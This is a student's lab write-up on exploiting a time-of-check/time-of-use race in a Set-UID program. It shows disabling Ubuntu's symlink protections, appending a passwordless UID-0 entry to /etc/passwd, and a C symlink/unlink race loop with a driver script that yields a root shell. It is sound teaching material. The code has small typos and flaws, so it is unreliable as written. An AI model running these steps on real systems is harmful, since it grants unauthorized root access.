# Race Condition Vulnerability Lab
- a race condition occurs when multiple processes access and manipulate the same data concurrently, and the outcome of the execution depends on the particular order in which the access takes place
- If a privileged program has a race-condition vulnerability, attackers can run a parallel process to "race" against the privileged program, with an intention to change the behaviors of the program
- topics:
    - race condition
    - sticky symlink protection
    - principle of least privilege

## Environment Setup
- Turn off countermeasures
    - Ubuntu has a built-in protection that restricts who can follow a symlink, symlinks in world-writable sticky directories (e.g., `/tmp`) cannot be followed if the follower and directory owner do not match the symlink owner
        - `$ sudo sysctl -w fs.protected_symlinks=0`
    - Ubuntu 20.04 introduces another security mechanism that prevents the root form writing files in `/tmp` that are owned by others
        - `$ sudo sysctl fs.protected_regular=0`

## Task 1: Choosing Our Target
- the entry for `root` in `/etc/passwd`: `root:x:0:0:root:/root:/bin/bash`
- a general entry contains 7 fields
    - `username:password:uid:gid:user_info:home_directory:login_shell`
    - the `password` field used to contain an encrypted password, now password hashes will be stored in a separate file `/etc/shadow` (in this case, this field will be `x`)
- it is more difficult to exploit race condition to append to both `/etc/passwd` and `/etc/shadow`, instead, we can put password in the second field (`x`) of an entry in `/etc/passwd` 
- the magic value in Ubuntu live CD for a passowrd-less account: `U6aMy0wojraho`, if we put this value in the password field of a user entry, we only need to hit the return key when prompted for a password
- test
    - append `test:U6aMy0wojraho:0:0:test:/root:/bin/bash` to `/etc/passwd`
        ```
        seed@...$ su test
        Password: (Press Enter)
        root@...#
        ```

## Task 2: Launching the Race Condition Attack
- goal: exploit race condition vulnerability in a vulnerable `Set-UID` program `vulp.c`, and the ultimate goal is to get root privilege, the critical step is to make `/tmp/XYZ` point to the `/etc/passwd` within the window between check (`access(fn, W_OK)`) and use (`fopen(fn, "a+")`)

### Task 2.A: Simulating a Slow Machine
- add `sleep(10)` between `access()` and `fopen()`
- invoke `vulp`
    ```
    $ ./vulp
    test:U6aMy0wojraho:0:0:test:/root:/bin/bash
    ```
- create symlink after enter the content to `vulp`
    ```
    $ ln -sf /etc/passwd /tmp/XYZ
    (after vulp finishes executing)
    $ su test
    Password: (Press Enter)
    # whoami
    root
    ```

### Task 2.A: The Real Attack
- remove `sleep()`
- typicall strategy is to run an attack program in parallel, perfect timing is very hard to achieve
- write the attack program in C:
    - `symlink("/etc/passwd", "/tmp/XYZ");`
    - `unlink("/tmp/XYZ");`
- automatically running `vulp` and detecting whether the attack is successful by monitoring whether `/etc/passwd` changes with a script
    ```
    #!/bin/bash

    CHECK_FILE="ls -l /etc/passwd"
    old=$($CHECK_FILE)
    new=$($CHECK_FILE)
    while ["$old"=="$new"]
    do
        echo "test:U6aMy0wojraho:0:0:test:/root:/bin/bash" | ./vulp
        new=$(CHECK_FILE)
    done
    echo "STOP... The passwd file has been changed"
    ```
- the core code of our target program `auto_atk.c`
    ```
    while(1) {
        symlink("/etc/passwd", "/tmp/XYZ");
        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XXX");
        unlink("/tmp/XYZ");
    }
    ```
- **attack succeeded**: we run our attack program, repeatedly link `/tmp/XYZ` to `/etc/passwd` and a `seed` owned file `/tmp/XXX`, and then run `target_process.sh`
    ```
    $ gcc -o auto_atk auto_atk.c
    $ ./auto_atk
    ```
    ```
    $ ./target_process.sj
    Permission denied
    Permission denied
    Permission denied
    Permission denied
    Permission denied
    STOP... The passwd file has been changed
    $ test
    Password:
    #
    ```

- **attack failed**: in most cases, after a few loops, the owner of `/tmp/XYZ` becomes `root`, and the attack will not success, to imporve the chance to success, each time this happens, we should manually delete `/tmp/XYZ`
    ```
    $ ls -l /tmp/XYZ
    -rw-rw-r-- 1 root seed 0 Jan 30 23:45 /tmp/XYZ
    ```

### Task 2.B: An Improved Attack
- when the owner of `/tmp/XYZ` becomes `root`, our attack program can never remove or `unlink()` it, because the `/tmp` folder has a "sticky" bit on, meaning that only the owner of the file can delete the file, even though the folder is world-writable
- the reason for this problem is that out attack program itself has a race condition vulnerability, the attack program is context switched out right after `unlink()`, but before it links the name to another file (`symlink()`), and the target `Set-UID` program gets a change to run `fopen(fn, "a+")`, it creates a new file with `root` being the owner

